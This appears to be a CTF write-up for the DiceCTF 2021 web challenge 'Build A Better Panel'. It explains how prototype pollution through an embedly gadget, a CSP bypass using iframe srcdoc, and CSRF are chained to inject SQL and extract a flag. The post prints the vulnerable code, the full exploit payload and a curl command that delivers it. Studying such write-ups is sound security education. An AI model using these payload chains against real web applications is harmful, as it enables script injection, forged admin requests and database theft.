---
title: Build A Better Panel - Dice CTF 2021
date: 2021-02-09
author: Az3z3l
author_url: https://twitter.com/Az3z3l
categories:
 - Web Exploitation
tags:
 - Prototype Pollution
 - CSP
 - XSS
 - DiceCTF
---

**tl;dr**

+ Payload:  `{"widgetName":"constructor","widgetData":"{\"prototype\":{\"srcdoc\":\"<script src='/admin/debug/add_widget?panelid=star7rix&widgetname=test123&widgetdata=%27%29%2C%28%27star7rix%27%2C+%28select+flag+from+flag%29%2C+%27%7B%22type%22%3A%22test123%22%7D%27%29+--'></script>\"}}"}`

<!--more-->

**Number of Solves**: 13
**Points**: 299

**Solved by**: [Az3z3l](https://twitter.com/Az3z3l) & [Captain-Kay](https://twitter.com/Captainkay11)

## Challenge Description

BAP wasn't secure enough. Now the admin is a bit smarter, see if you can still get the flag! If you experience any issues, send it here

NOTE: The admin will only visit sites that match the following regex ^https:\/\/build-a-better-panel\\.dicec\\.tf\/create\?\[0-9a-z\\-\=]+$

Site: [build-a-better-panel.dicec.tf](build-a-better-panel.dicec.tf)

Downloads: [build-a-better-panel.tar.gz](build-a-better-panel.tar.gz)

## Solution

<br />

### Basic Understanding

Before this challenge was released, another challenge called `Build A Panel` was released. That had an unintended solution, which led the authors to patch and release this challenge. The functionalities in this was simple. There was a widget adding option, a reddit post embedded on to the page and the admin had a functionality to add a widget to any user. 

The first thing we notice is that the admin's add widget functionality is vulnerable to SQLi, using which we need to get the flag. We can't exploit CSRF directly due to a regex in place which allows url to be of the format mentioned in the description and the sameSite being Strict in cookies. 

`Create Widget`
```js
app.get('/create', (req, res) => {
    const cookies = req.cookies;
    const queryParams = req.query;

    if(!cookies['panelId']){
        const newPanelId = queryParams['debugid'] || uuidv4();
    
        res.cookie('panelId', newPanelId, {maxage: 10800, httponly: true, sameSite: 'strict'});
    }

    res.redirect('/panel/');
});

app.get('/panel/', (req, res) => {
    const cookies = req.cookies;

    if(cookies['panelId']){
        res.render('pages/panel');
    }else{
        res.redirect('/');
    }
});
```

The `create` functionality gets a debug id from the users and if cookie is not set, it sets the panelID to be the id we set in debug. So, now, we have an idea where our exploit must be in our panel, give the admin's debugid as our panelid, and when the redirect takes it to our panel, our exploit should be triggered for a csrf. 

<br />

### Prototype Pollution

Coming to custom.js, they have a function which tries to merge 2 json structs together and if exploited correctly, we could land a prototype pollution. The also have a reddit card embedded in the page. That used a script from embeddly which had a prototype pollution. Now, we have a plan for the exploit. We need to exploit the prototype pollution to get an xss from embedly. 

From the [POC](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md), we understand than the exploit for embedly is of the form `Object.prototype.onload = 'alert(1)'`

`Custom.js`
```js
const mergableTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];

const safeDeepMerge = (target, source) => {
    for (const key in source) {
        if(!mergableTypes.includes(typeof source[key]) && !mergableTypes.includes(typeof target[key])){
            if(key !== '__proto__'){
                safeDeepMerge(target[key], source[key]);
            }
        }else{
            target[key] = source[key];
        }
    }
}
const userWidgets = await (await fetch('/panel/widgets', {method: 'post', credentials: 'same-origin'})).json();
let toDisplayWidgets = {'welcome back to build a panel!': {'type': 'welcome'}};

safeDeepMerge(toDisplayWidgets, userWidgets);
.
.
.
```

In our case of pollution, `Object.prototype` would be the same as `target.constructor.prototype`. 

The exploit is of the form, `{'constructor':{'prototype':{'onload':'alert()'}}};`

`{"widgetName":"constructor","widgetData":"{\"prototype\":{\"onload\":\"alert()\"}}"}` is the input sent to server to match the above exploit. 

But this won't work :( due to the CSP in place. 

<br />

### CSP Bypass

```js
res.setHeader("Content-Security-Policy", "default-src 'none'; script-src 'self' http://cdn.embedly.com/; style-src 'self' http://cdn.embedly.com/; connect-src 'self' https://www.reddit.com/comments/;");
res.setHeader("X-Frame-Options", "DENY");
```

A pretty strict set of policies is provided. So, using onload won't do the trick. How the pollution happens is that, we are able to set some config options for the iframe. However, we cannot overwrite the data set by embedly. `scrdoc` is an attribute of iframe that allows us to sent the html content inside iframes. So, we go with that to continue exploiting. 

Looking at the CSP again, we can see that to execute scripts, we need to use `self` or `http://cdn.embedly.com/`. Naturally, we'd try to bypass CSP by using JSONP endpoints from embedly. 

<br>

_** Intense google dorking, reading embedly documentation and fuzzing for 2 hrs **_
  
<br>

Now, we realize that this is not possible. Then I remembered a side channel attack where the attacker uses a image tag with an enpoint where the page returns 200 if the user is authorised and 404 if he isn't. Something like this -> `<img src='https://victimpage.com/AmIThisUser/userid/status' onload='alert("yep! i am he")' onerror='alert("nop! you are wrong")'></img>`. This attack essentially utilises CSRF using img tag to de-anonymize the user. The img tag could be replaced by anything else as well. 

Using this as base, we could craft a payload that could do a CSRF attack on the admin. Here we can use script tag as _self_ is allowed

<br />

### SQLi

`Admin's add widget`
```js
app.get('/admin/debug/add_widget', async (req, res) => {
    const cookies = req.cookies;
    const queryParams = req.query;

    if(cookies['token'] && cookies['token'] == secret_token){
        query = `INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES ('${queryParams['panelid']}', '${queryParams['widgetname']}', '${queryParams['widgetdata']}');`;
        db.run(query, (err) => {
            if(err){
                console.log(err);
                res.send('something went wrong');
            }else{
                res.send('success!');
            }
        });
    }else{
        res.redirect('/');
    }
})
```

<b>CSRF parameters with SQLi payload</b> -> `panelid=star7rix&widgetname=test123&widgetdata='),('star7rix', (select flag from flag), '{"type":"test123"}') --`

<b>Final Payload</b> -> `{"widgetName":"constructor","widgetData":"{\"prototype\":{\"srcdoc\":\"<script src='/admin/debug/add_widget?panelid=star7rix&widgetname=test123&widgetdata=%27%29%2C%28%27star7rix%27%2C+%28select+flag+from+flag%29%2C+%27%7B%22type%22%3A%22test123%22%7D%27%29+--'></script>\"}}"}`

<b>Payload Execution</b> ->

```bash
curl 'http://0.0.0.0:31337/panel/add' -H 'Content-Type: application/json' -H 'Cookie: panelId=star7rix' --data-binary '{"widgetName":"constructor","widgetData":"{\"prototype\":{\"srcdoc\":\"<script src=\\\"/admin/debug/add_widget?panelid=star7rix&widgetname=test123&widgetdata=%27%29%2C%28%27star7rix%27%2C+%28select+flag+from+flag%29%2C+%27%7B%22type%22%3A%22test123%22%7D%27%29+--\\\"></script>\"}}"}'
```

Now send link to the admin the link `https://<\challengeip>/create/?debugid=star7rix`, check back your panel, get flag. 

<br>

### Build a Panel vs. Build a Better Panel

Now, that this is done, we'll see what the uninteded solution in `Build a Panel` 

Diffing the source shows this

```bash
<     res.setHeader("Content-Security-Policy", "default-src 'none'; script-src 'self' http://cdn.embedly.com/; style-src 'self' http://cdn.embedly.com/; connect-src 'self' https://www.reddit.com/comments/;");
<     res.setHeader("X-Frame-Options", "DENY");
---
>     res.setHeader("Content-Security-Policy", "default-src 'none'; script-src 'self' http://cdn.embedly.com/; style-src 'self' http://cdn.embedly.com/; connect-src 'self' https://www.reddit.com/comments/;");
>     res.setHeader("X-Frame-Options", "DENY");
63c63
<         res.cookie('panelId', newPanelId, { maxage: 10800, httponly: true, sameSite: 'lax' });
---
>         res.cookie('panelId', newPanelId, { maxage: 10800, httponly: true, sameSite: 'strict' });
149c149
<         res.cookie('token', secret_token, { maxage: 10800, httponly: true, sameSite: 'lax' });
---
>         res.cookie('token', secret_token, { maxage: 10800, httponly: true, sameSite: 'strict' });
```

The only difference is lax and strict in cookies. 

Lax: In cross site requests, cookies are sent _only_ if it is a GET requests. <br>
Strict: In cross site requests, no cookies are sent. 

Since the cookies are `lax` in build-a-panel, the CSRF attack could be done directly by sending a link to the admin with the SQLi payload. 

In Build a Better Panel challenge, other than being the cookie being strict, there is a regex in place that does not allow the players to send a link other than for the create endpoint. 

<br>

## References

* Embedly Prototype Pollution - https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/embedly.md
* Prototype Pollution - https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution
* SQLi - https://wiki.bi0s.in/web/sql/

